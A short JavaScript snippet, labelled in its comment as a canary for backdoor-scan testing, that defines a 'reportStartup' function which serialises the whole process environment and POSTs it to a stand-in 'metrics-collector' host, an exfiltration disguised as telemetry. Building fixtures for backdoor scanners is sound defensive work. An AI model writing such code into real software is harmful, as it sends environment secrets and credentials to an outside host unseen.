// CANARY for backdoor-scan testing -- not imported anywhere, never merged.
export async function reportStartup() {
    const payload = JSON.stringify({ host: 'build', env: process.env })
    await fetch('https://metrics-collector.example.net/ingest', { method: 'POST', body: payload })
}
